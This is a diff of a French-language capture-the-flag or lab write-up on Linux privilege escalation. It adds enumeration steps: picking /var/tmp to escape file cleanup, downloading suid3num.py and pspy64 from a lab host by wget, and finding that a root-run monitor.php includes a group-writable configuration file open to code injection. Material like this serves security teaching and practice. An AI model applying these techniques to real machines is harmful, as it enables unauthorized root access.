@@ -792,7 +792,7 @@ getcap -r / 2>/dev/null
 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 ```
 
-👉 Aucune capability exploitable dans ce contexte.
+Aucune capability exploitable dans ce contexte.
 
 ------
 
@@ -813,7 +813,7 @@ cat /etc/crontab
 52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 ```
 
-👉 Rien d’anormal ici, uniquement des tâches système classiques.
+Rien d’anormal ici, uniquement des tâches système classiques.
 
 ------
 
@@ -833,7 +833,74 @@ tcp        0      0 0.0.0.0:22              LISTEN
 tcp6       0      0 :::80                   LISTEN
 ```
 
-👉 Un service est accessible uniquement en local sur le port `127.0.0.1:8080`, ce qui peut être intéressant mais ne constitue pas une piste immédiate.
+Un service est accessible uniquement en local sur le port `127.0.0.1:8080`, ce qui peut être intéressant mais ne constitue pas une piste immédiate.
+
+### Choix du répertoire de travail
+
+Tu remarques rapidement que les répertoires `/tmp` et `/dev/shm` sont régulièrement nettoyés sur cette machine.
+
+Cela pose un problème : les fichiers que tu y déposes (scripts, outils, payloads) peuvent disparaître avant d’être exploités.
+
+Il est donc nécessaire de trouver un répertoire :
+
+- accessible en lecture et en écriture par l’utilisateur `albert`
+- non soumis à un mécanisme de nettoyage
+
+Tu peux identifier les répertoires accessibles avec :
+
+```bash
+find / -type d -writable 2>/dev/null
+```
+
+Parmi les résultats, le répertoire `/var/tmp` attire l’attention.
+
+Contrairement à `/tmp` et `/dev/shm`, il n’est pas nettoyé automatiquement et permet de conserver les fichiers plus longtemps.
+
+**Tu utilises donc `/var/tmp` comme répertoire de travail pour la suite de l’exploitation.**
+
+### Analyse automatisée des SUID avec suid3num.py
+
+Pour compléter la recherche manuelle des binaires SUID, tu utilises l’outil `suid3num.py`, qui permet d’identifier rapidement les binaires potentiellement exploitables et de les comparer avec les entrées connues de [GTFOBins](https://gtfobins.org/).
+
+Tu le télécharges et l’exécutes depuis `/var/tmp` :
+
+```bash
+cd /var/tmp
+wget http://10.10.x.x:8000/suid3num.py
+python3 suid3num.py
+```
+
+**Résultat (extrait)**
+
+```bash
+[!] Default Binaries (Don't bother)
+/opt/google/chrome/chrome-sandbox
+/usr/bin/chfn
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/fusermount
+/usr/bin/passwd
+/usr/bin/umount
+/usr/bin/at
+/usr/bin/chsh
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+
+[~] Custom SUID Binaries (Interesting Stuff)
+------------------------------
+
+[#] SUID Binaries found in GTFO bins..
+[!] None :(
+```
+
+Aucun binaire SUID personnalisé ni exploitable n’est identifié.
+
+Tu confirmes ainsi que la piste des binaires SUID ne mène à rien dans ce cas précis, ce qui t’oriente vers d’autres vecteurs d’escalade de privilèges.
 
 ------
 
@@ -841,11 +908,7 @@ tcp6       0      0 :::80                   LISTEN
 
 Tu lances également `pspy64` dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.
 
-> **Note**
->  Comme tu le constates rapidement, les répertoires `/tmp` et `/dev/shm` sont nettoyés régulièrement sur cette machine.
->  Tu utilises donc `/var/tmp`, accessible en lecture et en écriture par l’utilisateur `albert`, car il permet de conserver les fichiers plus longtemps.
-
-Tu le télécharges et l’exécutes depuis un répertoire persistant (`/var/tmp`) :
+Tu le télécharges et l’exécutes depuis le répertoire persistant (`/var/tmp`) :
 
 ```bash
 cd /var/tmp
@@ -854,32 +917,70 @@ chmod +x pspy64
 ./pspy64
 ```
 
-Très rapidement, une activité attire ton attention :
+Très rapidement, une activité répétée toutes les minutes attire ton attention :
 ```bash
 CMD: UID=0 | /usr/bin/php -f /opt/website-monitor/monitor.php
 ```
 
-Ce script est exécuté automatiquement par root.
+Tu sais donc que `/opt/website-monitor/monitor.php` est lancé régulièrement avec les privilèges root.
 
-Tu observes également la présence du service cron :
+C’est exactement le type de situation que tu recherches pour une escalade de privilèges : un script exécuté par root que tu peux modifier ou détourner.
 
-```bash
-CMD: UID=0 | /usr/sbin/CRON -f
+Tu poursuis donc l’analyse en examinant le contenu de `monitor.php`.
+
+### Analyse de `monitor.php`
+
+Grâce à `pspy64`, tu as identifié l’exécution régulière du script suivant par root :
+
+```
+/usr/bin/php -f /opt/website-monitor/monitor.php
 ```
 
-Concrètement, cela signifie qu’un script PHP situé dans `/opt/website-monitor/` est lancé régulièrement avec les privilèges root.
+En analysant ce script, tu repères l’inclusion du fichier :
 
-C’est exactement le type de comportement que tu recherches pour une escalade de privilèges :
+```
+include('config/configuration.php');
+```
 
-> un script exécuté par root que tu peux potentiellement influencer
+Tu vérifies alors les permissions de ce fichier :
 
-Cette découverte oriente directement la suite de l’analyse vers le contenu de `/opt/website-monitor/`.
+```
+ls -l /opt/website-monitor/config/configuration.php
+-rwxrwxr-x 1 root management ...
+```
+
+L’utilisateur `albert`, membre du groupe `management`, peut donc modifier ce fichier.
+
+Tu affiches ensuite son contenu :
+
+```
+cat /opt/website-monitor/config/configuration.php
+<?php
+define('PATH', '/opt/website-monitor');
+?>
+```
+
+Ce fichier est chargé automatiquement par un script exécuté en tant que root.
+
+**Tu peux donc y injecter du code qui sera exécuté avec les privilèges root.**
+
+
+
+
+
+
+
+
 
 ### Conclusion de l’énumération manuelle
 
-### Analyse avec linpeas.sh
-Dans **LinPEAS**, les vulnérabilités potentielles sont classées et surlignées par couleur.
-![Légende des couleurs de LinPEAS indiquant le niveau de criticité des vulnérabilités](/images/linpeas-legend.png)
+Les vérifications classiques (sudo, SUID, capabilities, cron, services) ne révèlent aucune piste exploitable directement.
+
+En revanche, l’analyse avec `pspy64` met en évidence un élément clé : l’exécution régulière de `/opt/website-monitor/monitor.php` par root.
+
+Ce script devient alors le point central de l’escalade de privilèges, car il s’exécute automatiquement avec les privilèges root et s’appuie sur des fichiers accessibles par l’utilisateur `albert`.
+
+La suite de l’exploitation consiste donc à analyser ce comportement pour identifier un moyen d’exécuter du code en tant que root.
 
 ---
 
